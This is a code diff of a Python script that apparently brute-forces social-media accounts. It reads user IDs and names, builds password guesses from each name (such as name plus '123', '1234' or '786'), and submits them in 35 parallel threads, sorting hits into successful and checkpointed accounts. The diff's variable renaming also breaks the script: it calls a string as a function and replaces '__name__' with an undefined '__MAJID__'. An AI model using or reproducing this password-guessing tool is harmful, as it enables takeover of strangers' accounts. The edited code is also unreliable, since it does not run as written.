@@ -568,15 +568,15 @@ class __chigoue__:
             with YayanGanteng(max_workers=35) as kirim:
                 for yntkts in self.id:
                    try:
-                       uid, YASHIKA💘SAMAR = yntkts.split('|')
-                       xz = YASHIKA💘SAMAR.split(' ')
+                       uid, MAJID = yntkts.split('|')
+                       xz = MAJID.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                           pwx = [YASHIKA💘SAMAR, xz[0]+xz[1], xz[0]+"123"]
+                           pwx = [MAJID, xz[0]+xz[1], xz[0]+"123"]
                        else:
-                           pwx = [YASHIKA💘SAMAR, xz[0]+xz[1], xz[0]+"123"]
+                           pwx = [MAJID, xz[0]+xz[1], xz[0]+"123"]
                        kirim.submit(self.__metode__,url,uid,pwx)
                    except:pass
-            hasil(ok,cp)
+            MAJID(ok,cp)
             
             
         elif pw in["2","02"]:
@@ -586,12 +586,12 @@ class __chigoue__:
             with YayanGanteng(max_workers=35) as kirim:
                 for yntkts in self.id:
                    try:
-                       uid, YASHIKA💘SAMAR = yntkts.split('|')
-                       xz = YASHIKA💘SAMAR.split(' ')
+                       uid, MAJID = yntkts.split('|')
+                       xz = MAJID.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                           pwx = [YASHIKA💘SAMAR, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+"12", xz[0]+"1122", xz[0]+"123456", xz[0]+"786", xz[0]+xz[1]]
+                           pwx = [MAJID, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+"12", xz[0]+"1122", xz[0]+"123456", xz[0]+"786", xz[0]+xz[1]]
                        else:
-                           pwx = [YASHIKA💘SAMAR, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+"12", xz[0]+"1122", xz[0]+"123456", xz[0]+"786", xz[0]+xz[1]]
+                           pwx = [MAJID, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+"12", xz[0]+"1122", xz[0]+"123456", xz[0]+"786", xz[0]+xz[1]]
                        kirim.submit(self.__metode1__,url,uid,pwx)
                    except:pass
             hasil(ok,cp)
@@ -603,14 +603,14 @@ class __chigoue__:
             with YayanGanteng(max_workers=35) as kirim:
                 for yntkts in self.id:
                    try:
-                       uid, YASHIKA💘SAMAR = yntkts.split('|')
-                       xz = YASHIKA💘SAMAR.split(' ')
+                       uid, MAJID = yntkts.split('|')
+                       xz = MAJID.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                           pwx = [YASHIKA💘SAMAR, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
+                           pwx = [MAJID, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
                        else:
-                           pwx = [YASHIKA💘SAMAR, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
+                           pwx = [MAJID, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
                        kirim.submit(self.__metode__,url,uid,pwx)
                    except:pass
-            YASHIKA💘SAMAR(ok,cp)
-if __name__ == '__main__':
+            MAJID(ok,cp)
+if __MAJID__ == '__main__':
     file()
